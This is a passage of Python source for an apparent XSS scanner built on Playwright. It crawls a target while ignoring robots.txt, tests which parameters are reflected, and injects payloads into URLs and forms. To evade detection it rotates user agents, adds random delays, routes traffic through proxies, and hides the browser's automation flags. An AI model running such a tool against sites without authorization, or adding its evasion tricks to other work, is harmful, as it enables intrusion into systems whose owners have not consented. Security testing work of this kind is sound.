        self.timeout = timeout
        self.waf_aware = waf_aware
        self.min_delay = min_delay  
        self.max_delay = max_delay  
        self.request_delay = request_delay  
        self.max_retries = max_retries  
        self.cookies = cookies or []  
        self.custom_headers = headers or {}  
        self.proxy = proxy  
        self.current_user_agent_index = 0
        self.request_count = 0
        
    def _get_random_user_agent(self) -> str:
        """Get a random user agent for rotation"""
        return random.choice(self.USER_AGENTS)
    
    def _get_next_user_agent(self) -> str:
        """Get next user agent in rotation"""
        ua = self.USER_AGENTS[self.current_user_agent_index]
        self.current_user_agent_index = (self.current_user_agent_index + 1) % len(self.USER_AGENTS)
        return ua
    
    async def _random_delay(self, base_delay: float = None):
        """Add random delay to avoid rate limiting"""
        if base_delay is None:
            base_delay = self.request_delay
        delay = base_delay + random.uniform(self.min_delay, self.max_delay)
        logger.debug(f"Waiting {delay:.2f}s to avoid rate limiting...")
        await asyncio.sleep(delay)
    
    async def _retry_request(self, func, *args, max_retries: int = None, **kwargs):
        """Retry a request with exponential backoff"""
        if max_retries is None:
            max_retries = self.max_retries
        
        for attempt in range(max_retries + 1):
            try:
                return await func(*args, **kwargs)
            except Exception as e:
                if attempt < max_retries:
                    wait_time = (2 ** attempt) + random.uniform(0, 1)  
                    logger.warning(f"Request failed (attempt {attempt + 1}/{max_retries + 1}): {e}. Retrying in {wait_time:.2f}s...")
                    await asyncio.sleep(wait_time)
                else:
                    logger.error(f"Request failed after {max_retries + 1} attempts: {e}")
                    raise
    
    def _parse_proxy(self, proxy_string: str) -> Optional[Dict[str, str]]:
        """
        Parse proxy string into Playwright-compatible format.
        
        Supports formats:
        - socks5://proxy.example.com:1080
        - socks5://username:password@proxy.example.com:1080
        - http://proxy.example.com:8080
        - http://username:password@proxy.example.com:8080
        - https://proxy.example.com:8080
        - https://username:password@proxy.example.com:8080
        
        Returns dict with 'server', optional 'username', and optional 'password'
        """
        if not proxy_string:
            return None
        
        proxy_string = proxy_string.strip()
        
        
        try:
            
            if '@' in proxy_string:
                
                parts = proxy_string.split('@', 1)
                auth_part = parts[0]
                server_part = parts[1]
                
                
                if '://' in auth_part:
                    protocol, auth_credentials = auth_part.split('://', 1)
                    server = f"{protocol}://{server_part}"
                else:
                    server = f"http://{server_part}"
                    auth_credentials = auth_part
                
                
                if ':' in auth_credentials:
                    username, password = auth_credentials.split(':', 1)
                    return {
                        'server': server,
                        'username': username,
                        'password': password
                    }
                else:
                    
                    return {
                        'server': server,
                        'username': auth_credentials
                    }
            else:
                
                
                if not proxy_string.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
                    
                    proxy_string = f"socks5://{proxy_string}"
                
                return {
                    'server': proxy_string
                }
        except Exception as e:
            logger.error(f"Error parsing proxy string '{proxy_string}': {e}")
            return None
    
    async def test_proxy(self) -> bool:
        """
        Test proxy connectivity by checking public IP address.
        
        Returns True if proxy is working, False otherwise.
        """
        if not self.proxy:
            logger.warning("No proxy configured to test")
            return False
        
        logger.info("Testing proxy connectivity...")
        proxy_config = self._parse_proxy(self.proxy)
        if not proxy_config:
            logger.error("Failed to parse proxy configuration")
            return False
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                
                
                context_options = {
                    'viewport': {'width': 1920, 'height': 1080},
                    'user_agent': self._get_random_user_agent()
                }
                context_options['proxy'] = proxy_config
                
                context = await browser.new_context(**context_options)
                page = await context.new_page()
                
                
                ip_check_urls = [
                    'https://api.ipify.org?format=json',
                    'https://httpbin.org/ip',
                    'https://api.myip.com',
                ]
                
                proxy_ip = None
                service_used = None
                
                for url in ip_check_urls:
                    try:
                        logger.debug(f"Testing proxy with {url}...")
                        response = await page.goto(url, timeout=10000, wait_until="networkidle")
                        
                        if response and response.status == 200:
                            content = await page.content()
                            
                            try:
                                
                                json_text = await page.evaluate("() => document.body.innerText")
                                data = json.loads(json_text)
                                
                                
                                if 'ip' in data:
                                    proxy_ip = data['ip']
                                elif 'origin' in data:
                                    proxy_ip = data['origin'].split(',')[0].strip()
                                elif 'query' in data:
                                    proxy_ip = data['query']
                                
                                if proxy_ip:
                                    service_used = url
                                    break
                            except:
                                
                                import re
                                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                                matches = re.findall(ip_pattern, content)
                                if matches:
                                    proxy_ip = matches[0]
                                    service_used = url
                                    break
                    except Exception as e:
                        logger.debug(f"Failed to test with {url}: {e}")
                        continue
                
                await browser.close()
                
                if proxy_ip:
                    logger.info(f"✓ Proxy is working! Your IP through proxy: {proxy_ip}")
                    logger.info(f"  Service used: {service_used}")
                    
                    
                    logger.info("  Comparing with direct connection...")
                    try:
                        async with async_playwright() as p2:
                            browser2 = await p2.chromium.launch(headless=True)
                            context2 = await browser2.new_context(
                                viewport={'width': 1920, 'height': 1080},
                                user_agent=self._get_random_user_agent()
                            )
                            page2 = await context2.new_page()
                            
                            for url in ip_check_urls:
                                try:
                                    response = await page2.goto(url, timeout=10000, wait_until="networkidle")
                                    if response and response.status == 200:
                                        json_text = await page2.evaluate("() => document.body.innerText")
                                        data = json.loads(json_text)
                                        
                                        direct_ip = None
                                        if 'ip' in data:
                                            direct_ip = data['ip']
                                        elif 'origin' in data:
                                            direct_ip = data['origin'].split(',')[0].strip()
                                        elif 'query' in data:
                                            direct_ip = data['query']
                                        
                                        if direct_ip:
                                            if direct_ip != proxy_ip:
                                                logger.info(f"  ✓ Direct IP: {direct_ip} (different from proxy IP - proxy is working!)")
                                            else:
                                                logger.warning(f"  ⚠ Direct IP: {direct_ip} (same as proxy IP - proxy may not be working)")
                                            break
                                except:
                                    continue
                            
                            await browser2.close()
                    except Exception as e:
                        logger.debug(f"Could not compare with direct connection: {e}")
                    
                    return True
                else:
                    logger.error("✗ Proxy test failed: Could not determine IP address")
                    return False
                    
        except Exception as e:
            logger.error(f"✗ Proxy test failed: {e}")
            return False
    
    async def scan(self, test_proxy_first: bool = False):
        """Main scanning function with WAF-aware and stealth features"""
        logger.info(f"Starting XSS scan on: {self.target_url}")
        logger.info(f"WAF-aware mode: {self.waf_aware}")
        logger.info(f"Delay range: {self.min_delay}-{self.max_delay}s (base: {self.request_delay}s)")
        if self.proxy:
            
            proxy_log = self.proxy
            if '@' in proxy_log:
                parts = proxy_log.split('@')
                if '://' in parts[0]:
                    auth_part = parts[0].split('://')[1]
                    if ':' in auth_part:
                        username = auth_part.split(':')[0]
                        proxy_log = proxy_log.replace(auth_part, f"{username}:***")
            logger.info(f"Using proxy: {proxy_log}")
            
            
            if test_proxy_first:
                logger.info("Testing proxy before starting scan...")
                if not await self.test_proxy():
                    logger.warning("Proxy test failed!")
                    try:
                        response = input("Continue anyway? (y/n): ")
                        if response.lower() != 'y':
                            logger.info("Scan cancelled by user")
                            return
                    except (EOFError, KeyboardInterrupt):
                        
                        logger.warning("Non-interactive mode: continuing with scan despite proxy test failure")
                        logger.warning("To cancel, use Ctrl+C")
                        await asyncio.sleep(2)  
        
        async with async_playwright() as p:
            
            browser = await p.chromium.launch(
                headless=self.headless,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-dev-shm-usage',
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                ]
            )
            
            
            user_agent = self._get_random_user_agent()
            
            
            default_headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            extra_http_headers = {**default_headers, **self.custom_headers}
            
            
            proxy_config = None
            if self.proxy:
                proxy_config = self._parse_proxy(self.proxy)
                if proxy_config:
                    logger.info(f"Proxy configured: {proxy_config.get('server', 'N/A')}")
            
            
            context_options = {
                'viewport': {'width': 1920, 'height': 1080},
                'user_agent': user_agent,
                'locale': 'en-US',
                'timezone_id': 'America/New_York',
                'permissions': [],
                'extra_http_headers': extra_http_headers
            }
            
            
            if proxy_config:
                context_options['proxy'] = proxy_config
            
            context = await browser.new_context(**context_options)
            
            
            if self.cookies:
                parsed_url = urlparse(self.target_url)
                domain = parsed_url.netloc
                
                
                cookies_to_add = []
                for cookie in self.cookies:
                    cookie_dict = cookie if isinstance(cookie, dict) else {}
                    
                    if 'domain' not in cookie_dict:
                        cookie_dict['domain'] = domain
                    
                    if 'path' not in cookie_dict:
                        cookie_dict['path'] = '/'
                    
                    if 'name' in cookie_dict and 'value' in cookie_dict:
                        cookies_to_add.append(cookie_dict)
                
                if cookies_to_add:
                    await context.add_cookies(cookies_to_add)
                    logger.info(f"Added {len(cookies_to_add)} cookies for authentication")
            
            
            await context.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined
                });
            """)
            
            page = await context.new_page()
            
            try:
                
                crawler = WebCrawler(self.target_url, self.max_depth, self.max_pages)
                
                
                logger.info("Crawling website (robots.txt ignored)...")
                forms = await self._retry_request(crawler.crawl, page)
                logger.info(f"Discovered {len(forms)} forms, {len(crawler.visited_urls)} URLs, {len(crawler.discovered_parameters)} unique parameters, and {len(crawler.sensitive_js)} sensitive JS sinks")
                
                
                logger.info("Extracting parameters from forms...")
                for form in forms:
                    
                    form_url = urljoin(form['url'], form['action'])
                    parsed_form_url = urlparse(form_url)
                    form_params = parse_qs(parsed_form_url.query)
                    for param_name in form_params.keys():
                        crawler.discovered_parameters.add(param_name)
                        if param_name not in crawler.parameter_urls:
                            crawler.parameter_urls[param_name] = set()
                        crawler.parameter_urls[param_name].add(form_url)
                    
                    
                    for inp in form.get('inputs', []):
                        param_name = inp.get('name')
                        if param_name:
                            crawler.discovered_parameters.add(param_name)
                            if param_name not in crawler.parameter_urls:
                                crawler.parameter_urls[param_name] = set()
                            
                            crawler.parameter_urls[param_name].add(form_url)
                            crawler.parameter_urls[param_name].add(form['url'])
                
                logger.info(f"Total unique parameters discovered: {len(crawler.discovered_parameters)}")
                
                
                self.crawler_sensitive_js = crawler.sensitive_js
                self.crawler_discovered_parameters = crawler.discovered_parameters
                self.crawler_visited_urls = crawler.visited_urls
                self.crawler_parameter_urls = crawler.parameter_urls  
                
                logger.info(f"Extraction complete!")
                logger.info(f"  - URLs discovered: {len(crawler.visited_urls)}")
                logger.info(f"  - Parameters discovered: {len(crawler.discovered_parameters)}")
                logger.info(f"  - Sensitive JS sinks: {len(crawler.sensitive_js)}")
                
                
                logger.info("Testing parameter reflection...")
                reflected_parameters = await self._test_parameter_reflection(page, crawler.parameter_urls, crawler.visited_urls)
                self.crawler_reflected_parameters = reflected_parameters
                logger.info(f"  - Reflected parameters: {len(reflected_parameters)}")
                
            finally:
                await browser.close()
    
    async def _test_parameter_reflection(self, page: Page, parameter_urls: Dict[str, Set[str]], visited_urls: Set[str]) -> Dict[str, List[Dict]]:
        """Test which parameters get reflected in the page response"""
        reflected_parameters = {}  
        
        
        total_params = len(parameter_urls)
        logger.info(f"Testing reflection for {total_params} parameters...")
        
        for param_idx, (param_name, urls) in enumerate(parameter_urls.items(), 1):
            
            reflection_marker = f"XSS_REFL_TEST_{param_name}_{random.randint(100000, 999999)}"
            
            if param_idx % 10 == 0:
                logger.info(f"Testing reflection: {param_idx}/{total_params} parameters...")
            
            
            test_urls = list(urls)[:5]  
            reflected_urls = []
            
            for url in test_urls:
                try:
                    
                    parsed = urlparse(url)
                    test_params = parse_qs(parsed.query, keep_blank_values=True)
                    test_params[param_name] = [reflection_marker]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    
                    
                    try:
                        response = await asyncio.wait_for(
                            page.goto(test_url, wait_until="domcontentloaded", timeout=15000),
                            timeout=20.0
                        )
                        
                        if response and response.status >= 400:
                            continue
                        
                        
                        await asyncio.sleep(1.0)
                        
                        
                        content = await page.content()
                        page_text = await page.evaluate("() => document.body ? document.body.innerText : ''")
                        
                        
                        reflected_in = []
                        if reflection_marker in content:
                            
                            if f'<input' in content and reflection_marker in content:
                                
                                if f'value="{reflection_marker}"' in content or f"value='{reflection_marker}'" in content:
                                    reflected_in.append('input_value')
                                elif reflection_marker in content:
                                    
                                    if f'<script>{reflection_marker}' in content or f'<script>{reflection_marker}' in content:
                                        reflected_in.append('script_tag')
                                    elif f'onclick="{reflection_marker}' in content or f"onclick='{reflection_marker}'" in content:
                                        reflected_in.append('event_handler')
                                    elif f'<div>{reflection_marker}' in content or f'<span>{reflection_marker}' in content:
                                        reflected_in.append('html_content')
                                    elif f'href="{reflection_marker}' in content or f"href='{reflection_marker}'" in content:
                                        reflected_in.append('href_attribute')
                                    else:
                                        reflected_in.append('html_response')
                            
                            
                            if reflection_marker in page_text:
                                reflected_in.append('text_content')
                            
                            
                            scripts_content = await page.evaluate("""
                                () => {
                                    const scripts = Array.from(document.querySelectorAll('script'));
                                    return scripts.map(s => s.textContent || s.innerHTML).join('\\n');
                                }
                            """)
                            if reflection_marker in scripts_content:
                                reflected_in.append('javascript')
                            
                            
                            current_url = page.url
                            if reflection_marker in current_url:
                                reflected_in.append('url')
                            
                            if not reflected_in:
                                reflected_in.append('html_response')  
                            
                            reflected_urls.append({
                                'url': test_url,
                                'reflected_in': reflected_in,
                                'context': self._get_reflection_context(content, reflection_marker)
                            })
                    
                    except asyncio.TimeoutError:
                        logger.debug(f"Timeout testing reflection for {param_name} on {url}")
                        continue
                    except Exception as e:
                        logger.debug(f"Error testing reflection for {param_name} on {url}: {e}")
                        continue
                    
                    
                    await asyncio.sleep(0.3)
                
                except Exception as e:
                    logger.debug(f"Error processing URL {url} for parameter {param_name}: {e}")
                    continue
            
            
            if not reflected_urls and param_name in parameter_urls:
                
                test_urls = list(visited_urls)[:2]  
                for base_url in test_urls:
                    try:
                        parsed = urlparse(base_url)
                        separator = '&' if '?' in base_url else '?'
                        test_url = f"{base_url}{separator}{param_name}={reflection_marker}"
                        
                        try:
                            response = await asyncio.wait_for(
                                page.goto(test_url, wait_until="domcontentloaded", timeout=15000),
                                timeout=20.0
                            )
                            
                            if response and response.status >= 400:
                                continue
                            
                            await asyncio.sleep(1.0)
                            
                            content = await page.content()
                            page_text = await page.evaluate("() => document.body ? document.body.innerText : ''")
                            
                            if reflection_marker in content or reflection_marker in page_text:
                                reflected_in = ['html_response']
                                
                                scripts_content = await page.evaluate("""
                                    () => {
                                        const scripts = Array.from(document.querySelectorAll('script'));
                                        return scripts.map(s => s.textContent || s.innerHTML).join('\\n');
                                    }
                                """)
                                if reflection_marker in scripts_content:
                                    reflected_in.append('javascript')
                                
                                reflected_urls.append({
                                    'url': test_url,
                                    'reflected_in': reflected_in,
                                    'context': self._get_reflection_context(content, reflection_marker)
                                })
                        
                        except asyncio.TimeoutError:
                            continue
                        except Exception as e:
                            logger.debug(f"Error testing reflection on {test_url}: {e}")
                            continue
                        
                        await asyncio.sleep(0.3)
                    
                    except Exception as e:
                        logger.debug(f"Error testing {param_name} on {base_url}: {e}")
                        continue
            
            if reflected_urls:
                reflected_parameters[param_name] = reflected_urls
        
        return reflected_parameters
    
    def _get_reflection_context(self, content: str, marker: str) -> str:
        """Extract context around the reflection marker"""
        try:
            index = content.find(marker)
            if index == -1:
                return "Not found"
            
            
            start = max(0, index - 100)
            end = min(len(content), index + len(marker) + 100)
            context = content[start:end]
            
            
            context = context.replace('\n', ' ').replace('\r', ' ').replace('\t', ' ')
            context = ' '.join(context.split())  
            
            return context[:200]  
        except:
            return "Context extraction failed"
    
    async def _test_form(self, page: Page, form: Dict):
        """Test a form for XSS vulnerabilities - WAF-aware (DISABLED: forms are not submitted, only parameters extracted)"""
        payloads = XSSPayload.get_payloads(waf_aware=self.waf_aware)
        form_url = urljoin(form['url'], form['action'])
        
        
        max_payloads = 30 if self.waf_aware else 20  
        payloads_to_test = payloads[:max_payloads] if len(payloads) > max_payloads else payloads
        
        for payload_idx, payload in enumerate(payloads_to_test, 1):
            try:
                self.request_count += 1
                
                if form['method'].upper() == 'GET':
                    
                    params = {}
                    for inp in form['inputs']:
                        params[inp['name']] = payload
                    
                    test_url = f"{form_url}?{urlencode(params)}"
                    await self._test_url(page, test_url, payload, 'FORM_GET', form)
                    
                elif form['method'].upper() == 'POST':
                    
                    form_data = {}
                    for inp in form['inputs']:
                        form_data[inp['name']] = payload
                    
                    await self._retry_request(
                        page.goto, form_url, 
                        wait_until="networkidle", 
                        timeout=self.timeout
                    )
                    await self._fill_and_submit_form(page, form, form_data, payload)
                
                
                if payload_idx < len(payloads_to_test):
                    await self._random_delay(base_delay=1.0)
                
            except Exception as e:
                logger.error(f"Error testing form {form_url} with payload: {e}")
                await self._random_delay(base_delay=2.0)  
                continue
    
    async def _fill_and_submit_form(self, page: Page, form: Dict, form_data: Dict, payload: str):
        """Fill and submit a form - WAF-aware"""
        try:
            
            for inp in form['inputs']:
                field_name = inp['name']
                field_type = inp['type']
                
                try:
                    if field_type == 'textarea':
                        await page.fill(f"textarea[name='{field_name}']", form_data[field_name])
                    elif field_type == 'select':
                        await page.select_option(f"select[name='{field_name}']", form_data[field_name])
                    else:
                        await page.fill(f"input[name='{field_name}']", form_data[field_name])
                except:
                    
                    try:
                        await page.fill(f"[name='{field_name}']", form_data[field_name])
                    except:
                        pass
            
            
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            
            detector = XSSDetector(page, waf_aware=self.waf_aware)
            await page.click("input[type='submit'], button[type='submit'], button:not([type])")
            await asyncio.sleep(2)  
            
            
            is_vulnerable, method = await detector.detect_vulnerability(payload)
            
            if is_vulnerable:
                result = {
                    'type': 'FORM_POST',
                    'url': form['url'],
                    'action': form['action'],
                    'payload': payload,
                    'detection_method': method,
                    'timestamp': datetime.now().isoformat(),
                    'form_data': form_data,
                    'waf_aware': self.waf_aware
                }
                self.successful_xss.append(result)
                self.results.append(result)
                logger.warning(f"✓ XSS FOUND: {form['url']} - {method}")
        
        except Exception as e:
            logger.error(f"Error submitting form: {e}")
    
    async def _test_url_parameters(self, page: Page, url: str, discovered_params: Set[str] = None):
        """Test URL parameters for XSS - WAF-aware with rate limiting and comprehensive parameter discovery"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            
            all_params = set(params.keys())
            if discovered_params:
                all_params.update(discovered_params)
            
            payloads = XSSPayload.get_payloads(waf_aware=self.waf_aware)
            
            max_payloads_per_param = 10 if self.waf_aware else 8  
            
            
            max_params_per_url = 5  
            
            if not params and not all_params:
                
                common_params = ['id', 'page', 'search', 'q', 'query']
                for param_name in common_params[:3]:  
                    payloads_to_test = payloads[:max_payloads_per_param]
                    for payload_idx, payload in enumerate(payloads_to_test, 1):
                        try:
                            self.request_count += 1
                            encoded_payload = urlencode({param_name: payload})
                            test_url = f"{url}?{encoded_payload}" if '?' not in url else f"{url}&{encoded_payload}"
                            
                            
                            await asyncio.wait_for(
                                self._test_url(page, test_url, payload, 'URL_PARAM', {'parameter': param_name}),
                                timeout=30.0  
                            )
                            
                            if payload_idx < len(payloads_to_test):
                                await self._random_delay(base_delay=0.5)  
                        except asyncio.TimeoutError:
                            logger.warning(f"Timeout testing {test_url}")
                            continue
                        except Exception as e:
                            logger.debug(f"Error testing parameter {param_name} on {url}: {e}")
                            continue
            else:
                
                params_to_test = list(all_params)[:max_params_per_url]
                for param_idx, param_name in enumerate(params_to_test, 1):
                    payloads_to_test = payloads[:max_payloads_per_param]
                    for payload_idx, payload in enumerate(payloads_to_test, 1):
                        try:
                            self.request_count += 1
                            test_params = params.copy()
                            test_params[param_name] = [payload]
                            new_query = urlencode(test_params, doseq=True)
                            test_url = urlunparse(parsed._replace(query=new_query))
                            
                            
                            await asyncio.wait_for(
                                self._test_url(page, test_url, payload, 'URL_PARAM', {'parameter': param_name}),
                                timeout=30.0  
                            )
                            
                            if payload_idx < len(payloads_to_test):
                                await self._random_delay(base_delay=0.5)  
                        except asyncio.TimeoutError:
                            logger.warning(f"Timeout testing {test_url}")
                            continue
                        except Exception as e:
                            logger.debug(f"Error testing parameter {param_name} on {url}: {e}")
                            continue
                    
                    
                    if param_idx < len(params_to_test):
                        await asyncio.sleep(0.3)
        
        except Exception as e:
            logger.error(f"Error in _test_url_parameters for {url}: {e}", exc_info=True)
            
    
    async def _test_url(self, page: Page, url: str, payload: str, test_type: str, context: Dict):
        """Test a URL for XSS vulnerability - WAF-aware with retry logic and timeout"""
        try:
            detector = XSSDetector(page, waf_aware=self.waf_aware)
            
            
            try:
                await asyncio.wait_for(
                    self._retry_request(
                        page.goto, url,
                        wait_until="domcontentloaded",  
                        timeout=min(self.timeout, 20000)  
                    ),
                    timeout=25.0  
                )
            except asyncio.TimeoutError:
                logger.debug(f"Timeout loading {url}")
                return
            except Exception as e:
                logger.debug(f"Error loading {url}: {e}")
                return
            
            
            wait_time = 2.0 if self.waf_aware else 1.5  
            await asyncio.sleep(wait_time)
            
            
            try:
                is_vulnerable, method = await asyncio.wait_for(
                    detector.detect_vulnerability(payload),
                    timeout=10.0  
                )
            except asyncio.TimeoutError:
                logger.debug(f"Timeout detecting vulnerability for {url}")
                
                is_vulnerable = False
                method = ""
            
            if is_vulnerable:
                result = {
                    'type': test_type,
                    'url': url,
                    'payload': payload,
                    'detection_method': method,
                    'timestamp': datetime.now().isoformat(),
                    'context': context,
                    'waf_aware': self.waf_aware
                }
                self.successful_xss.append(result)
                self.results.append(result)
                logger.warning(f"✓ XSS FOUND: {url} - {method}")
            else:
                
                try:
                    content = await asyncio.wait_for(
                        page.content(),
                        timeout=5.0
                    )
                    if detector._is_payload_reflected(content, payload, ""):
                        result = {
                            'type': test_type,
                            'url': url,
                            'payload': payload,
                            'detection_method': 'Payload reflected in response (potential XSS)',
                            'timestamp': datetime.now().isoformat(),
                            'context': context,
                            'status': 'potential',
                            'waf_aware': self.waf_aware
                        }
                        self.results.append(result)
                        logger.info(f"⚠ Potential XSS (reflected): {url}")
                except asyncio.TimeoutError:
                    logger.debug(f"Timeout getting content for {url}")
                except Exception as e:
                    logger.debug(f"Error checking reflection for {url}: {e}")
        
        except asyncio.TimeoutError:
            logger.debug(f"Overall timeout testing URL {url}")
        except Exception as e:
            logger.debug(f"Error testing URL {url}: {e}")
            
    
    async def test_parameters(self, parameters: Optional[List[str]] = None, test_proxy_first: bool = False):
        """
        Test mode: Test XSS vulnerabilities on specific parameters or all parameters in the URL.
        This mode does not crawl - it only tests the provided URL.
        
        Args:
            parameters: List of parameter names to test. If None, tests all parameters found in URL.
            test_proxy_first: Whether to test proxy connectivity before starting.
        """
        logger.info(f"Starting XSS parameter test mode on: {self.target_url}")
        logger.info(f"WAF-aware mode: {self.waf_aware}")
        
        
        self.successful_xss = []
        self.results = []
        
        if self.proxy:
            
            proxy_log = self.proxy
            if '@' in proxy_log:
                parts = proxy_log.split('@')
                if '://' in parts[0]:
                    auth_part = parts[0].split('://')[1]
                    if ':' in auth_part:
                        username = auth_part.split(':')[0]
                        proxy_log = proxy_log.replace(auth_part, f"{username}:***")
            logger.info(f"Using proxy: {proxy_log}")
            
            
            if test_proxy_first:
                logger.info("Testing proxy before starting test...")
                if not await self.test_proxy():
                    logger.warning("Proxy test failed!")
                    try:
                        response = input("Continue anyway? (y/n): ")
                        if response.lower() != 'y':
                            logger.info("Test cancelled by user")
                            return
                    except (EOFError, KeyboardInterrupt):
                        logger.warning("Non-interactive mode: continuing with test despite proxy test failure")
                        await asyncio.sleep(2)
        
        
        parsed = urlparse(self.target_url)
        existing_params = set(parse_qs(parsed.query).keys())
        
        
        if parameters:
            
            params_to_test = [p.strip() for p in parameters if p.strip()]
            logger.info(f"Testing specified parameters: {', '.join(params_to_test)}")
        else:
            
            params_to_test = list(existing_params)
            if not params_to_test:
                logger.warning("No parameters found in URL. Testing common parameter names...")
                params_to_test = ['id', 'page', 'search', 'q', 'query', 'name', 'value', 'input', 'data']
            else:
                logger.info(f"Testing all parameters found in URL: {', '.join(params_to_test)}")
        
        async with async_playwright() as p:
            
            browser = await p.chromium.launch(
                headless=self.headless,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-dev-shm-usage',
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                ]
            )
            
            
            user_agent = self._get_random_user_agent()
            
            
            default_headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            extra_http_headers = {**default_headers, **self.custom_headers}
            
            
            proxy_config = None
            if self.proxy:
                proxy_config = self._parse_proxy(self.proxy)
                if proxy_config:
                    logger.info(f"Proxy configured: {proxy_config.get('server', 'N/A')}")
            
            
            context_options = {
                'viewport': {'width': 1920, 'height': 1080},
                'user_agent': user_agent,
                'locale': 'en-US',
                'timezone_id': 'America/New_York',
                'permissions': [],
                'extra_http_headers': extra_http_headers
            }
            
            
            if proxy_config:
                context_options['proxy'] = proxy_config
            
            context = await browser.new_context(**context_options)
            
            
            if self.cookies:
                parsed_url = urlparse(self.target_url)
                domain = parsed_url.netloc
                
                cookies_to_add = []
                for cookie in self.cookies:
                    cookie_dict = cookie if isinstance(cookie, dict) else {}
                    if 'domain' not in cookie_dict:
                        cookie_dict['domain'] = domain
                    if 'path' not in cookie_dict:
                        cookie_dict['path'] = '/'
                    if 'name' in cookie_dict and 'value' in cookie_dict:
                        cookies_to_add.append(cookie_dict)
                
                if cookies_to_add:
                    await context.add_cookies(cookies_to_add)
                    logger.info(f"Added {len(cookies_to_add)} cookies for authentication")
            
            
            await context.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined
                });
            """)
            
            page = await context.new_page()
            
            try:
                
                total_params = len(params_to_test)
                logger.info(f"Testing {total_params} parameter(s) with XSS payloads...")
                
                for param_idx, param_name in enumerate(params_to_test, 1):
                    logger.info(f"[{param_idx}/{total_params}] Testing parameter: {param_name}")
                    
                    
                    await self._test_url_parameters(page, self.target_url, {param_name})
                    
                    
                    if param_idx < total_params:
                        await self._random_delay(base_delay=1.0)
                
                
                logger.info("\n" + "=" * 80)
                logger.info("TEST SUMMARY")
                logger.info("=" * 80)
                logger.info(f"Parameters tested: {total_params}")
                logger.info(f"Total requests: {self.request_count}")
                logger.info(f"XSS vulnerabilities found: {len(self.successful_xss)}")
                logger.info(f"Potential vulnerabilities (reflected): {len([r for r in self.results if r.get('status') == 'potential'])}")
                logger.info("=" * 80)
                
                if self.successful_xss:
                    logger.warning("\n✓ XSS VULNERABILITIES FOUND:")
                    for vuln in self.successful_xss:
                        logger.warning(f"  - {vuln['url']}")
                        logger.warning(f"    Parameter: {vuln.get('context', {}).get('parameter', 'N/A')}")
                        logger.warning(f"    Payload: {vuln['payload']}")
                        logger.warning(f"    Method: {vuln['detection_method']}")
                else:
                    logger.info("\nNo XSS vulnerabilities found.")
                
            finally:
                await browser.close()
    
    def save_results(self, output_dir: str = "results"):
        """Save extracted parameters and sensitive JS sinks to domain-specific text file, or test results if in test mode"""
        output_path = Path(output_dir)
        output_path.mkdir(exist_ok=True)
        
        
        parsed_url = urlparse(self.target_url)
        domain = parsed_url.netloc.replace('www.', '')
        
        safe_domain = "".join(c for c in domain if c.isalnum() or c in ('-', '_', '.'))
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        
        is_test_mode = (hasattr(self, 'successful_xss') or hasattr(self, 'results')) and \
                      not hasattr(self, 'crawler_visited_urls')
        
        if is_test_mode:
            
            output_file = output_path / f"{safe_domain}_test_{timestamp}.txt"
            json_file = output_path / f"{safe_domain}_test_{timestamp}.json"
            
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write(f"XSS PARAMETER TEST REPORT\n")
                f.write("=" * 80 + "\n\n")
                f.write(f"Domain: {domain}\n")
                f.write(f"Target URL: {self.target_url}\n")
                f.write(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"WAF-aware mode: {self.waf_aware}\n")
                f.write(f"Total Requests: {getattr(self, 'request_count', 0)}\n\n")
                
                
                successful_xss = getattr(self, 'successful_xss', [])
                potential_xss = [r for r in getattr(self, 'results', []) if r.get('status') == 'potential']
                
                f.write("=" * 80 + "\n")
                f.write(f"XSS VULNERABILITIES FOUND: {len(successful_xss)}\n")
                f.write("=" * 80 + "\n\n")
                
                if successful_xss:
                    for idx, vuln in enumerate(successful_xss, 1):
                        f.write(f"Vulnerability #{idx}:\n")
                        f.write(f"  URL: {vuln['url']}\n")
                        f.write(f"  Parameter: {vuln.get('context', {}).get('parameter', 'N/A')}\n")
                        f.write(f"  Payload: {vuln['payload']}\n")
                        f.write(f"  Detection Method: {vuln['detection_method']}\n")
                        f.write(f"  Type: {vuln.get('type', 'N/A')}\n")
                        f.write(f"  Timestamp: {vuln.get('timestamp', 'N/A')}\n")
                        f.write("\n")
                else:
                    f.write("  No XSS vulnerabilities found.\n\n")
                
                
                if potential_xss:
                    f.write("=" * 80 + "\n")
                    f.write(f"POTENTIAL XSS (REFLECTED): {len(potential_xss)}\n")
                    f.write("=" * 80 + "\n\n")
                    for idx, vuln in enumerate(potential_xss, 1):
                        f.write(f"Potential #{idx}:\n")
                        f.write(f"  URL: {vuln['url']}\n")
                        f.write(f"  Parameter: {vuln.get('context', {}).get('parameter', 'N/A')}\n")
                        f.write(f"  Payload: {vuln['payload']}\n")
                        f.write(f"  Status: {vuln.get('detection_method', 'Payload reflected in response')}\n")
                        f.write("\n")
                
                f.write("=" * 80 + "\n")
                f.write("END OF REPORT\n")
                f.write("=" * 80 + "\n")
            
            
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump({
                    'domain': domain,
                    'target_url': self.target_url,
                    'test_date': datetime.now().isoformat(),
